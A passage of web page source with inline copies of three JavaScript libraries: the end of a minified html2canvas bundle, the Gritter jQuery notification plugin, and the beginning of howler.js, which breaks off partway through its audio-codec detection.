g},b.exports=d},{"./color":3,"./fontmetrics":7,"./log":13,"./nodecontainer":14,"./pseudoelementcontainer":18,"./stackingcontext":21,"./textcontainer":25,"./utils":26,punycode:1}],16:[function(a,b,c){function d(a,b,c){var d="withCredentials"in new XMLHttpRequest;if(!b)return Promise.reject("No proxy configured");var e=g(d),i=h(b,a,e);return d?k(i):f(c,i,e).then(function(a){return o(a.content)})}function e(a,b,c){var d="crossOrigin"in new Image,e=g(d),i=h(b,a,e);return d?Promise.resolve(i):f(c,i,e).then(function(a){return"data:"+a.type+";base64,"+a.content})}function f(a,b,c){return new Promise(function(d,e){var f=a.createElement("script"),g=function(){delete window.html2canvas.proxy[c],a.body.removeChild(f)};window.html2canvas.proxy[c]=function(a){g(),d(a)},f.src=b,f.onerror=function(a){g(),e(a)},a.body.appendChild(f)})}function g(a){return a?"":"html2canvas_"+Date.now()+"_"+ ++p+"_"+Math.round(1e5*Math.random())}function h(a,b,c){return a+"?url="+encodeURIComponent(b)+(c.length?"&callback=html2canvas.proxy."+c:"")}function i(a){return function(b){var c,d=new DOMParser;try{c=d.parseFromString(b,"text/html")}catch(e){m("DOMParser not supported, falling back to createHTMLDocument"),c=document.implementation.createHTMLDocument("");try{c.open(),c.write(b),c.close()}catch(f){m("createHTMLDocument write not supported, falling back to document.body.innerHTML"),c.body.innerHTML=b}}var g=c.querySelector("base");if(!g||!g.href.host){var h=c.createElement("base");h.href=a,c.head.insertBefore(h,c.head.firstChild)}return c}}function j(a,b,c,e,f,g){return new d(a,b,window.document).then(i(a)).then(function(a){return n(a,c,e,f,g,0,0)})}var k=a("./xhr"),l=a("./utils"),m=a("./log"),n=a("./clone"),o=l.decode64,p=0;c.Proxy=d,c.ProxyURL=e,c.loadUrlDocument=j},{"./clone":2,"./log":13,"./utils":26,"./xhr":28}],17:[function(a,b,c){function d(a,b){var c=document.createElement("a");c.href=a,a=c.href,this.src=a,this.image=new Image;var d=this;this.promise=new Promise(function(c,f){d.image.crossOrigin="Anonymous",d.image.onload=c,d.image.onerror=f,new e(a,b,document).then(function(a){d.image.src=a})["catch"](f)})}var e=a("./proxy").ProxyURL;b.exports=d},{"./proxy":16}],18:[function(a,b,c){function d(a,b,c){e.call(this,a,b),this.isPseudoElement=!0,this.before=":before"===c}var e=a("./nodecontainer");d.prototype.cloneTo=function(a){d.prototype.cloneTo.call(this,a),a.isPseudoElement=!0,a.before=this.before},d.prototype=Object.create(e.prototype),d.prototype.appendToDOM=function(){this.before?this.parent.node.insertBefore(this.node,this.parent.node.firstChild):this.parent.node.appendChild(this.node),this.parent.node.className+=" "+this.getHideClass()},d.prototype.cleanDOM=function(){this.node.parentNode.removeChild(this.node),this.parent.node.className=this.parent.node.className.replace(this.getHideClass(),"")},d.prototype.getHideClass=function(){return this["PSEUDO_HIDE_ELEMENT_CLASS_"+(this.before?"BEFORE":"AFTER")]},d.prototype.PSEUDO_HIDE_ELEMENT_CLASS_BEFORE="___html2canvas___pseudoelement_before",d.prototype.PSEUDO_HIDE_ELEMENT_CLASS_AFTER="___html2canvas___pseudoelement_after",b.exports=d},{"./nodecontainer":14}],19:[function(a,b,c){function d(a,b,c,d,e){this.width=a,this.height=b,this.images=c,this.options=d,this.document=e}var e=a("./log");d.prototype.renderImage=function(a,b,c,d){var e=a.cssInt("paddingLeft"),f=a.cssInt("paddingTop"),g=a.cssInt("paddingRight"),h=a.cssInt("paddingBottom"),i=c.borders,j=b.width-(i[1].width+i[3].width+e+g),k=b.height-(i[0].width+i[2].width+f+h);this.drawImage(d,0,0,d.image.width||j,d.image.height||k,b.left+e+i[3].width,b.top+f+i[0].width,j,k)},d.prototype.renderBackground=function(a,b,c){b.height>0&&b.width>0&&(this.renderBackgroundColor(a,b),this.renderBackgroundImage(a,b,c))},d.prototype.renderBackgroundColor=function(a,b){var c=a.color("backgroundColor");c.isTransparent()||this.rectangle(b.left,b.top,b.width,b.height,c)},d.prototype.renderBorders=function(a){a.forEach(this.renderBorder,this)},d.prototype.renderBorder=function(a){a.color.isTransparent()||null===a.args||this.drawShape(a.args,a.color)},d.prototype.renderBackgroundImage=function(a,b,c){var d=a.parseBackgroundImages();d.reverse().forEach(function(d,f,g){switch(d.method){case"url":var h=this.images.get(d.args[0]);h?this.renderBackgroundRepeating(a,b,h,g.length-(f+1),c):e("Error loading background-image",d.args[0]);break;case"linear-gradient":case"gradient":var i=this.images.get(d.value);i?this.renderBackgroundGradient(i,b,c):e("Error loading background-image",d.args[0]);break;case"none":break;default:e("Unknown background-image type",d.args[0])}},this)},d.prototype.renderBackgroundRepeating=function(a,b,c,d,e){var f=a.parseBackgroundSize(b,c.image,d),g=a.parseBackgroundPosition(b,c.image,d,f),h=a.parseBackgroundRepeat(d);switch(h){case"repeat-x":case"repeat no-repeat":this.backgroundRepeatShape(c,g,f,b,b.left+e[3],b.top+g.top+e[0],99999,f.height,e);break;case"repeat-y":case"no-repeat repeat":this.backgroundRepeatShape(c,g,f,b,b.left+g.left+e[3],b.top+e[0],f.width,99999,e);break;case"no-repeat":this.backgroundRepeatShape(c,g,f,b,b.left+g.left+e[3],b.top+g.top+e[0],f.width,f.height,e);break;default:this.renderBackgroundRepeat(c,g,f,{top:b.top,left:b.left},e[3],e[0])}},b.exports=d},{"./log":13}],20:[function(a,b,c){function d(a,b){f.apply(this,arguments),this.canvas=this.options.canvas||this.document.createElement("canvas"),this.options.canvas||(this.canvas.width=a,this.canvas.height=b),this.ctx=this.canvas.getContext("2d"),this.taintCtx=this.document.createElement("canvas").getContext("2d"),this.ctx.textBaseline="bottom",this.variables={},h("Initialized CanvasRenderer with size",a,"x",b)}function e(a){return a.length>0}var f=a("../renderer"),g=a("../lineargradientcontainer"),h=a("../log");d.prototype=Object.create(f.prototype),d.prototype.setFillStyle=function(a){return this.ctx.fillStyle="object"==typeof a&&a.isColor?a.toString():a,this.ctx},d.prototype.rectangle=function(a,b,c,d,e){this.setFillStyle(e).fillRect(a,b,c,d)},d.prototype.circle=function(a,b,c,d){this.setFillStyle(d),this.ctx.beginPath(),this.ctx.arc(a+c/2,b+c/2,c/2,0,2*Math.PI,!0),this.ctx.closePath(),this.ctx.fill()},d.prototype.circleStroke=function(a,b,c,d,e,f){this.circle(a,b,c,d),this.ctx.strokeStyle=f.toString(),this.ctx.stroke()},d.prototype.drawShape=function(a,b){this.shape(a),this.setFillStyle(b).fill()},d.prototype.taints=function(a){if(null===a.tainted){this.taintCtx.drawImage(a.image,0,0);try{this.taintCtx.getImageData(0,0,1,1),a.tainted=!1}catch(b){this.taintCtx=document.createElement("canvas").getContext("2d"),a.tainted=!0}}return a.tainted},d.prototype.drawImage=function(a,b,c,d,e,f,g,h,i){(!this.taints(a)||this.options.allowTaint)&&this.ctx.drawImage(a.image,b,c,d,e,f,g,h,i)},d.prototype.clip=function(a,b,c){this.ctx.save(),a.filter(e).forEach(function(a){this.shape(a).clip()},this),b.call(c),this.ctx.restore()},d.prototype.shape=function(a){return this.ctx.beginPath(),a.forEach(function(a,b){"rect"===a[0]?this.ctx.rect.apply(this.ctx,a.slice(1)):this.ctx[0===b?"moveTo":a[0]+"To"].apply(this.ctx,a.slice(1))},this),this.ctx.closePath(),this.ctx},d.prototype.font=function(a,b,c,d,e,f){this.setFillStyle(a).font=[b,c,d,e,f].join(" ").split(",")[0]},d.prototype.fontShadow=function(a,b,c,d){this.setVariable("shadowColor",a.toString()).setVariable("shadowOffsetY",b).setVariable("shadowOffsetX",c).setVariable("shadowBlur",d)},d.prototype.clearShadow=function(){this.setVariable("shadowColor","rgba(0,0,0,0)")},d.prototype.setOpacity=function(a){this.ctx.globalAlpha=a},d.prototype.setTransform=function(a){this.ctx.translate(a.origin[0],a.origin[1]),this.ctx.transform.apply(this.ctx,a.matrix),this.ctx.translate(-a.origin[0],-a.origin[1])},d.prototype.setVariable=function(a,b){return this.variables[a]!==b&&(this.variables[a]=this.ctx[a]=b),this},d.prototype.text=function(a,b,c){this.ctx.fillText(a,b,c)},d.prototype.backgroundRepeatShape=function(a,b,c,d,e,f,g,h,i){var j=[["line",Math.round(e),Math.round(f)],["line",Math.round(e+g),Math.round(f)],["line",Math.round(e+g),Math.round(h+f)],["line",Math.round(e),Math.round(h+f)]];this.clip([j],function(){this.renderBackgroundRepeat(a,b,c,d,i[3],i[0])},this)},d.prototype.renderBackgroundRepeat=function(a,b,c,d,e,f){var g=Math.round(d.left+b.left+e),h=Math.round(d.top+b.top+f);this.setFillStyle(this.ctx.createPattern(this.resizeImage(a,c),"repeat")),this.ctx.translate(g,h),this.ctx.fill(),this.ctx.translate(-g,-h)},d.prototype.renderBackgroundGradient=function(a,b){if(a instanceof g){var c=this.ctx.createLinearGradient(b.left+b.width*a.x0,b.top+b.height*a.y0,b.left+b.width*a.x1,b.top+b.height*a.y1);a.colorStops.forEach(function(a){c.addColorStop(a.stop,a.color.toString())}),this.rectangle(b.left,b.top,b.width,b.height,c)}},d.prototype.resizeImage=function(a,b){var c=a.image;if(c.width===b.width&&c.height===b.height)return c;var d,e=document.createElement("canvas");return e.width=b.width,e.height=b.height,d=e.getContext("2d"),d.drawImage(c,0,0,c.width,c.height,0,0,b.width,b.height),e},b.exports=d},{"../lineargradientcontainer":12,"../log":13,"../renderer":19}],21:[function(a,b,c){function d(a,b,c,d){e.call(this,c,d),this.ownStacking=a,this.contexts=[],this.children=[],this.opacity=(this.parent?this.parent.stack.opacity:1)*b}var e=a("./nodecontainer");d.prototype=Object.create(e.prototype),d.prototype.getParentStack=function(a){var b=this.parent?this.parent.stack:null;return b?b.ownStacking?b:b.getParentStack(a):a.stack},b.exports=d},{"./nodecontainer":14}],22:[function(a,b,c){function d(a){this.rangeBounds=this.testRangeBounds(a),this.cors=this.testCORS(),this.svg=this.testSVG()}d.prototype.testRangeBounds=function(a){var b,c,d,e,f=!1;return a.createRange&&(b=a.createRange(),b.getBoundingClientRect&&(c=a.createElement("boundtest"),c.style.height="123px",c.style.display="block",a.body.appendChild(c),b.selectNode(c),d=b.getBoundingClientRect(),e=d.height,123===e&&(f=!0),a.body.removeChild(c))),f},d.prototype.testCORS=function(){return"undefined"!=typeof(new Image).crossOrigin},d.prototype.testSVG=function(){var a=new Image,b=document.createElement("canvas"),c=b.getContext("2d");a.src="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'></svg>";try{c.drawImage(a,0,0),b.toDataURL()}catch(d){return!1}return!0},b.exports=d},{}],23:[function(a,b,c){function d(a){this.src=a,this.image=null;var b=this;this.promise=this.hasFabric().then(function(){return b.isInline(a)?Promise.resolve(b.inlineFormatting(a)):e(a)}).then(function(a){return new Promise(function(c){window.html2canvas.svg.fabric.loadSVGFromString(a,b.createCanvas.call(b,c))})})}var e=a("./xhr"),f=a("./utils").decode64;d.prototype.hasFabric=function(){return window.html2canvas.svg&&window.html2canvas.svg.fabric?Promise.resolve():Promise.reject(new Error("html2canvas.svg.js is not loaded, cannot render svg"))},d.prototype.inlineFormatting=function(a){return/^data:image\/svg\+xml;base64,/.test(a)?this.decode64(this.removeContentType(a)):this.removeContentType(a)},d.prototype.removeContentType=function(a){return a.replace(/^data:image\/svg\+xml(;base64)?,/,"")},d.prototype.isInline=function(a){return/^data:image\/svg\+xml/i.test(a)},d.prototype.createCanvas=function(a){var b=this;return function(c,d){var e=new window.html2canvas.svg.fabric.StaticCanvas("c");b.image=e.lowerCanvasEl,e.setWidth(d.width).setHeight(d.height).add(window.html2canvas.svg.fabric.util.groupSVGElements(c,d)).renderAll(),a(e.lowerCanvasEl)}},d.prototype.decode64=function(a){return"function"==typeof window.atob?window.atob(a):f(a)},b.exports=d},{"./utils":26,"./xhr":28}],24:[function(a,b,c){function d(a,b){this.src=a,this.image=null;var c=this;this.promise=b?new Promise(function(b,d){c.image=new Image,c.image.onload=b,c.image.onerror=d,c.image.src="data:image/svg+xml,"+(new XMLSerializer).serializeToString(a),c.image.complete===!0&&b(c.image)}):this.hasFabric().then(function(){return new Promise(function(b){window.html2canvas.svg.fabric.parseSVGDocument(a,c.createCanvas.call(c,b))})})}var e=a("./svgcontainer");d.prototype=Object.create(e.prototype),b.exports=d},{"./svgcontainer":23}],25:[function(a,b,c){function d(a,b){f.call(this,a,b)}function e(a,b,c){return a.length>0?b+c.toUpperCase():void 0}var f=a("./nodecontainer");d.prototype=Object.create(f.prototype),d.prototype.applyTextTransform=function(){this.node.data=this.transform(this.parent.css("textTransform"))},d.prototype.transform=function(a){var b=this.node.data;switch(a){case"lowercase":return b.toLowerCase();case"capitalize":return b.replace(/(^|\s|:|-|\(|\))([a-z])/g,e);case"uppercase":return b.toUpperCase();default:return b}},b.exports=d},{"./nodecontainer":14}],26:[function(a,b,c){c.smallImage=function(){return"data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"},c.bind=function(a,b){return function(){return a.apply(b,arguments)}},c.decode64=function(a){var b,c,d,e,f,g,h,i,j="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",k=a.length,l="";for(b=0;k>b;b+=4)c=j.indexOf(a[b]),d=j.indexOf(a[b+1]),e=j.indexOf(a[b+2]),f=j.indexOf(a[b+3]),g=c<<2|d>>4,h=(15&d)<<4|e>>2,i=(3&e)<<6|f,l+=64===e?String.fromCharCode(g):64===f||-1===f?String.fromCharCode(g,h):String.fromCharCode(g,h,i);return l},c.getBounds=function(a){if(a.getBoundingClientRect){var b=a.getBoundingClientRect(),c=null==a.offsetWidth?b.width:a.offsetWidth;return{top:b.top,bottom:b.bottom||b.top+b.height,right:b.left+c,left:b.left,width:c,height:null==a.offsetHeight?b.height:a.offsetHeight}}return{}},c.offsetBounds=function(a){var b=a.offsetParent?c.offsetBounds(a.offsetParent):{top:0,left:0};return{top:a.offsetTop+b.top,bottom:a.offsetTop+a.offsetHeight+b.top,right:a.offsetLeft+b.left+a.offsetWidth,left:a.offsetLeft+b.left,width:a.offsetWidth,height:a.offsetHeight}},c.parseBackgrounds=function(a){var b,c,d,e,f,g,h,i=" \r\n	",j=[],k=0,l=0,m=function(){b&&('"'===c.substr(0,1)&&(c=c.substr(1,c.length-2)),c&&h.push(c),"-"===b.substr(0,1)&&(e=b.indexOf("-",1)+1)>0&&(d=b.substr(0,e),b=b.substr(e)),j.push({prefix:d,method:b.toLowerCase(),value:f,args:h,image:null})),h=[],b=d=c=f=""};return h=[],b=d=c=f="",a.split("").forEach(function(a){if(!(0===k&&i.indexOf(a)>-1)){switch(a){case'"':g?g===a&&(g=null):g=a;break;case"(":if(g)break;if(0===k)return k=1,void(f+=a);l++;break;case")":if(g)break;if(1===k){if(0===l)return k=0,f+=a,void m();l--}break;case",":if(g)break;if(0===k)return void m();if(1===k&&0===l&&!b.match(/^url$/i))return h.push(c),c="",void(f+=a)}f+=a,0===k?b+=a:c+=a}}),m(),j}},{}],27:[function(a,b,c){function d(a){e.apply(this,arguments),this.type="linear"===a.args[0]?e.TYPES.LINEAR:e.TYPES.RADIAL}var e=a("./gradientcontainer");d.prototype=Object.create(e.prototype),b.exports=d},{"./gradientcontainer":9}],28:[function(a,b,c){function d(a){return new Promise(function(b,c){var d=new XMLHttpRequest;d.open("GET",a),d.onload=function(){200===d.status?b(d.responseText):c(new Error(d.statusText))},d.onerror=function(){c(new Error("Network Error"))},d.send()})}b.exports=d},{}]},{},[4])(4)});
</script>
	<script>/*
 * Gritter for jQuery
 * http://www.boedesign.com/
 *
 * Copyright (c) 2012 Jordan Boesch
 * Dual licensed under the MIT and GPL licenses.
 *
 * Date: February 24, 2012
 * Version: 1.7.4
 */

(function($){
 	
	/**
	* Set it up as an object under the jQuery namespace
	*/
	$.gritter = {};
	
	/**
	* Set up global options that the user can over-ride
	*/
	$.gritter.options = {
		position: '',
		class_name: '', // could be set to 'gritter-light' to use white notifications
		fade_in_speed: 'medium', // how fast notifications fade in
		fade_out_speed: 1000, // how fast the notices fade out
		time: 6000, // hang on the screen for...
		max_to_display: 0, //if not 0, only show this many notifications at once and queue others.
		close_on_click: false // dismiss notification on element-click
	};
	
	/**
	* Add a gritter notification to the screen
	* @see Gritter#add();
	*/
	$.gritter.add = function(params){

		try {
			return Gritter.addToQueue(params || {});
		} catch(e) {
		
			var err = 'Gritter Error: ' + e;
			if (typeof(console) !== 'undefined' && console.error) {
				console.error(err, params);
			} else {
				alert(err);
			}
				
		}
		
	};
	
	/**
	* Remove a gritter notification from the screen
	* @see Gritter#removeSpecific();
	*/
	$.gritter.remove = function(id, params){
		Gritter.removeSpecific(id, params || {});
	};
	
	/**
	* Remove all notifications
	* @see Gritter#stop();
	*/
	$.gritter.removeAll = function(params){
		Gritter.stop(params || {});
	}
	
	/**
	* Big fat Gritter object
	* @constructor (not really since its object literal)
	*/
	var Gritter = {
		
		// Public - options to over-ride with $.gritter.options in "add"
		position: '',
		fade_in_speed: '',
		fade_out_speed: '',
		time: '',
		close_on_click: '',
		
		// Private - no touchy the private parts
		_custom_timer: 0,
		_item_count: 0,
		_is_setup: 0,
		_tpl_close: '<a class="gritter-close" href="#" tabindex="1">Close Notification</a>',
		_tpl_title: '<span class="gritter-title">[[title]]</span>',
		_tpl_item: '<div id="gritter-item-[[number]]" class="gritter-item-wrapper [[item_class]]" style="display:none" role="alert"><div class="gritter-item">[[close]][[image]]<div class="[[class_name]]">[[title]]<p>[[text]]</p></div><div style="clear:both"></div></div><div class="gritter-bottom"></div></div>',
		_tpl_wrap: '<div id="gritter-notice-wrapper"></div>',
		_notificaiton_queue: [],
		
		
		/**
		* Add a notification to the queue.
		* @param {Object} params The object that contains all the options for drawing the notification
		* @return {Integer} The specific numeric id to that gritter notification
		*/
		addToQueue: function(params){
			// Handle straight text
			if(typeof(params) === 'string'){
				params = {text:params};
			}
			
			this._item_count++;
			this._notificaiton_queue.push($.extend(params, {item_number: this._item_count})); //add this notification to the end of the queue. include its unique id which is the item_count.
			this._updateDomFromQueue();
			return this._item_count;
		},
		
		
		/**
		* Check whether we can move a notification from the queue onto the DOM.
		*/
		_updateDomFromQueue: function(){
			var maxNotifications = $.gritter.options.max_to_display;
			var isLimited = maxNotifications > 0; // if maxNotifications is greater than 0, then there is a set limit.
			if(!isLimited || $('.gritter-item-wrapper').length < maxNotifications){ //no limit or have not reached the max yet
				if(this._notificaiton_queue.length > 0){ //there's something in the queue to add
					this._addToDom(this._notificaiton_queue.shift()); //put the first item in the queue onto the dom
				}
			}
		},
		
		/**
		* Add a gritter notification to the screen
		* @param {Object} params The object that contains all the options for drawing the notification
		*/
		_addToDom: function(params){
		
			// We might have some issues if we don't have a title or text!
			if(params.text === null){
				throw 'You must supply "text" parameter.'; 
			}
			
			// Check the options and set them once
			if(!this._is_setup){
				this._runSetup();
			}
			
			// Basics
			var title = params.title, 
				text = params.text,
				image = params.image || '',
				sticky = params.sticky || false,
				item_class = params.class_name || $.gritter.options.class_name,
				position = $.gritter.options.position,
				time_alive = params.time || '',
				widget_click_close = params.close_on_click || false;

			//this._testBorderRadius();
			this._verifyWrapper();
			
			var number = params.item_number, 
				tmp = this._tpl_item;
			
			// Assign callbacks
			$(['before_open', 'after_open', 'before_close', 'after_close','on_click']).each(function(i, val){
				Gritter['_' + val + '_' + number] = ($.isFunction(params[val])) ? params[val] : function(){};
			});

			// Reset
			this._custom_timer = 0;
			
			// A custom fade time set
			if(time_alive){
				this._custom_timer = time_alive;
			}
			
			var image_str = (image !== '') ? '<img src="' + image + '" class="gritter-image" />' : '',
				class_name = (image !== '') ? 'gritter-with-image' : 'gritter-without-image';
			
			// String replacements on the template
			if(title){
				title = this._str_replace('[[title]]',title,this._tpl_title);
			}else{
				title = '';
			}
			
			tmp = this._str_replace(
				['[[title]]', '[[text]]', '[[close]]', '[[image]]', '[[number]]', '[[class_name]]', '[[item_class]]'],
				[title, text, this._tpl_close, image_str, number, class_name, item_class], tmp
			);

			// If it's false, don't show another gritter message
			if(this['_before_open_' + number]() === false){
				return false;
			}

			$('#gritter-notice-wrapper').addClass(position).append(tmp);
			
			var item = $('#gritter-item-' + number);
			
			item.fadeIn(this.fade_in_speed, function(){
				Gritter['_after_open_' + number]($(this));
			});
			
			if(!sticky){
				this._setFadeTimer(item, number);
			}
			
			// Add on_click listener
			$(item).click(function(){
				Gritter['_' + 'on_click' + '_' + number]($(this));
				if(widget_click_close) {
					Gritter.removeSpecific(number, {}, $(item), true);
				}
			});

			/**
			 *  In order to avoid conflicts between on_click and before/after_close 
			 *  Disable on_click event when hover over close button
			 *  Enable on_click event on mouse leave
			 */
			$(item).find('.gritter-close').bind('mouseenter mouseleave', function(event){
				if(event.type == 'mouseenter'){
					$(item).off("click");
				} else {
					$(item).on("click",function(){
						Gritter['_' + 'on_click' + '_' + number]($(this));
						if(widget_click_close) {
							Gritter.removeSpecific(number, {}, $(item), true);
						}
					});
				}
			});

			// Bind the hover/unhover states
			$(item).bind('mouseenter mouseleave', function(event){
				if(event.type === 'mouseenter'){
					if(!sticky){ 
						Gritter._restoreItemIfFading($(this), number);
					}
				}
				else {
					if(!sticky){
						Gritter._setFadeTimer($(this), number);
					}
				}
				/*Gritter._hoverState($(this), event.type);*/
			});
			
			// Clicking (X) makes the perdy thing close
			$(item).find('.gritter-close').click(function(){
				Gritter.removeSpecific(number, {}, null, true);
				return false;
			});
		},
		
		/**
		* If we don't have any more gritter notifications, get rid of the wrapper using this check
		* @private
		* @param {Integer} unique_id The ID of the element that was just deleted, use it for a callback
		* @param {Object} e The jQuery element that we're going to perform the remove() action on
		* @param {Boolean} manual_close Did we close the gritter dialog with the (X) button
		*/
		_countRemoveWrapper: function(unique_id, e, manual_close){
			
			// Remove it then run the callback function
			e.remove();
			this['_after_close_' + unique_id](e, manual_close);
			
			// Check if the wrapper is empty, if it is.. remove the wrapper
			if($('.gritter-item-wrapper').length === 0){
				$('#gritter-notice-wrapper').remove();
			}
		
		},
		

		/**
		* Fade out an element after it's been on the screen for x amount of time
		* @private
		* @param {Object} e The jQuery element to get rid of
		* @param {Integer} unique_id The id of the element to remove
		* @param {Object} [params] An optional list of params to set fade speeds etc.
		* @param {Boolean} [unbind_events] Unbind the mouseenter/mouseleave events if they click (X)
		*/
		_fade: function(e, unique_id /*, params, unbind_events */){

			var params = arguments[2] || {},
				unbind_events = arguments[3] || false,
				fade = (typeof(params.fade) !== 'undefined') ? params.fade : true,
				fade_out_speed = params.speed || this.fade_out_speed,
				manual_close = unbind_events;

			this['_before_close_' + unique_id](e, manual_close);

			// If this is true, then we are coming from clicking the (X)
			if(unbind_events){
				e.unbind('mouseenter mouseleave');
			}

			// Fade it out or remove it
			if(fade){

				e.animate({
					opacity: 0
				}, fade_out_speed, function(){
					e.animate({ height: 0 }, 300, function(){
						Gritter._countRemoveWrapper(unique_id, e, manual_close);
					});
				});

			} else {

				this._countRemoveWrapper(unique_id, e);

			}

		},
		
	/**
		* Remove a specific notification based on an ID
		* @param {Integer} unique_id The ID used to delete a specific notification
		* @param {Object} params A set of options passed in to determine how to get rid of it
		* @param {Object} [e] The optional jQuery element that we're "fading" then removing
		* @param {Boolean} [unbind_events] If we clicked on the (X) we set this to true to unbind mouseenter/mouseleave
		*/
		removeSpecific: function(unique_id, params /*, e, unbind_events */){

			var e = arguments[2] || false,
				unbind_events = arguments[3] || false;

			if(!e){
				e = $('#gritter-item-' + unique_id);
			}

			// We set the fourth param to let the _fade function know to
			// unbind the "mouseleave" event.  Once you click (X) there's no going back!
			this._fade(e, unique_id, params || {}, unbind_events);

		},

		/**
		* If the item is fading out and we hover over it, restore it!
		* @private
		* @param {Object} e The HTML element to remove
		* @param {Integer} unique_id The ID of the element
		*/
		_restoreItemIfFading: function(e, unique_id){
			
			clearTimeout(this['_int_id_' + unique_id]);
			e.stop().css({ opacity: '', height: '' });
			
		},
		
		/**
		* Setup the global options - only once
		* @private
		*/
		_runSetup: function(){
		
			for(var opt in $.gritter.options){
				this[opt] = $.gritter.options[opt];
			}
			this._is_setup = 1;
			
		},
		
		/**
		* Set the notification to fade out after a certain amount of time
		* @private
		* @param {Object} item The HTML element we're dealing with
		* @param {Integer} unique_id The ID of the element
		*/
		_setFadeTimer: function(e, unique_id){
			
			var timer_str = (this._custom_timer) ? this._custom_timer : this.time;
			this['_int_id_' + unique_id] = setTimeout(function(){
				Gritter._fade(e, unique_id);
			}, timer_str);
		
		},
		
		/**
		* Bring everything to a halt
		* @param {Object} params A list of callback functions to pass when all notifications are removed
		*/  
		stop: function(params){
			
			// callbacks (if passed)
			var before_close = ($.isFunction(params.before_close)) ? params.before_close : function(){};
			var after_close = ($.isFunction(params.after_close)) ? params.after_close : function(){};
			
			var wrap = $('#gritter-notice-wrapper');
			before_close(wrap);
			wrap.fadeOut(function(){
				$(this).remove();
				after_close();
			});
		
		},
		
		/**
		* An extremely handy PHP function ported to JS, works well for templating
		* @private
		* @param {String/Array} search A list of things to search for
		* @param {String/Array} replace A list of things to replace the searches with
		* @return {String} sa The output
		*/  
		_str_replace: function(search, replace, subject, count){
		
			var i = 0, j = 0, temp = '', repl = '', sl = 0, fl = 0,
				f = [].concat(search),
				r = [].concat(replace),
				s = subject,
				ra = r instanceof Array, sa = s instanceof Array;
			s = [].concat(s);
			
			if(count){
				this.window[count] = 0;
			}
		
			for(i = 0, sl = s.length; i < sl; i++){
				
				if(s[i] === ''){
					continue;
				}
				
				for (j = 0, fl = f.length; j < fl; j++){
					
					temp = s[i] + '';
					repl = ra ? (r[j] !== undefined ? r[j] : '') : r[0];
					s[i] = (temp).split(f[j]).join(repl);
					
					if(count && s[i] !== temp){
						this.window[count] += (temp.length-s[i].length) / f[j].length;
					}
					
				}
			}
			
			return sa ? s : s[0];
			
		},
		
		/**
		* A check to make sure we have something to wrap our notices with
		* @private
		*/  
		_verifyWrapper: function(){
		  
			if($('#gritter-notice-wrapper').length === 0){
				$('#c2canvasdiv').append(this._tpl_wrap);
			}
		
		}
		
	}
	
})(jQuery);</script>
	<script>/*! howler.js v2.2.3 | (c) 2013-2020, James Simpson of GoldFire Studios | MIT License | howlerjs.com */
!(function () {
  "use strict";
  var e = function () {
    this.init();
  };
  e.prototype = {
    init: function () {
      var e = this || n;
      return (
        (e._counter = 1e3),
        (e._html5AudioPool = []),
        (e.html5PoolSize = 10),
        (e._codecs = {}),
        (e._howls = []),
        (e._muted = !1),
        (e._volume = 1),
        (e._canPlayEvent = "canplaythrough"),
        (e._navigator =
          "undefined" != typeof window && window.navigator
            ? window.navigator
            : null),
        (e.masterGain = null),
        (e.noAudio = !1),
        (e.usingWebAudio = !0),
        (e.autoSuspend = !0),
        (e.ctx = null),
        (e.autoUnlock = !0),
        e._setup(),
        e
      );
    },
    volume: function (e) {
      var o = this || n;
      if (
        ((e = parseFloat(e)), o.ctx || _(), void 0 !== e && e >= 0 && e <= 1)
      ) {
        if (((o._volume = e), o._muted)) return o;
        o.usingWebAudio &&
          o.masterGain.gain.setValueAtTime(e, n.ctx.currentTime);
        for (var t = 0; t < o._howls.length; t++)
          if (!o._howls[t]._webAudio)
            for (var r = o._howls[t]._getSoundIds(), a = 0; a < r.length; a++) {
              var u = o._howls[t]._soundById(r[a]);
              u && u._node && (u._node.volume = u._volume * e);
            }
        return o;
      }
      return o._volume;
    },
    mute: function (e) {
      var o = this || n;
      o.ctx || _(),
        (o._muted = e),
        o.usingWebAudio &&
          o.masterGain.gain.setValueAtTime(
            e ? 0 : o._volume,
            n.ctx.currentTime
          );
      for (var t = 0; t < o._howls.length; t++)
        if (!o._howls[t]._webAudio)
          for (var r = o._howls[t]._getSoundIds(), a = 0; a < r.length; a++) {
            var u = o._howls[t]._soundById(r[a]);
            u && u._node && (u._node.muted = !!e || u._muted);
          }
      return o;
    },
    stop: function () {
      for (var e = this || n, o = 0; o < e._howls.length; o++)
        e._howls[o].stop();
      return e;
    },
    unload: function () {
      for (var e = this || n, o = e._howls.length - 1; o >= 0; o--)
        e._howls[o].unload();
      return (
        e.usingWebAudio &&
          e.ctx &&
          void 0 !== e.ctx.close &&
          (e.ctx.close(), (e.ctx = null), _()),
        e
      );
    },
    codecs: function (e) {
      return (this || n)._codecs[e.replace(/^x-/, "")];
    },
    _setup: function () {
      var e = this || n;
      if (
        ((e.state = e.ctx ? e.ctx.state || "suspended" : "suspended"),
        e._autoSuspend(),
        !e.usingWebAudio)
      )
        if ("undefined" != typeof Audio)
          try {
            var o = new Audio();
            void 0 === o.oncanplaythrough && (e._canPlayEvent = "canplay");
          } catch (n) {
            e.noAudio = !0;
          }
        else e.noAudio = !0;
      try {
        var o = new Audio();
        o.muted && (e.noAudio = !0);
      } catch (e) {}
      return e.noAudio || e._setupCodecs(), e;
    },
    _setupCodecs: function () {
      var e = this || n,
        o = null;
      try {
        o = "undefined" != typeof Audio ? new Audio() : null;
      } catch (n) {
        return e;
      }
      if (!o || "function" != typeof o.canPlayType) return e;
      var t = o.canPlayType("audio/mpeg;").replace(/^no$/, ""),
        r = e._navigator ? e._navigator.userAgent : "",
        a = r.match(/OPR\/([0-6].)/g),
        u = a && parseInt(a[0].split("/")[1], 10) < 33,
        d = -1 !== r.indexOf("Safari") && -1 === r.indexOf("Chrome"),
        i = r.match(/Version\/(.*?) /),
        _ = d && i && parseInt(i[1], 10) < 15;
      return (
        (e._codecs = {
          mp3: !(u || (!t && !o.canPlayType("audio/mp3;").replace(/^no$/, ""))),
          mpeg: !!t,
          opus: !!o.canPlayType('audio/ogg; codecs="opus"').replace(/^no$/, ""),
          ogg: !!o
            .canPlayType('audio/ogg; codecs="vorbis"')
            .replace(/^no$/, ""),
          oga: !!o
            .canPlayType('audio/ogg; codecs="vorbis"')
            .replace(/^no$/, ""),
          wav: !!(
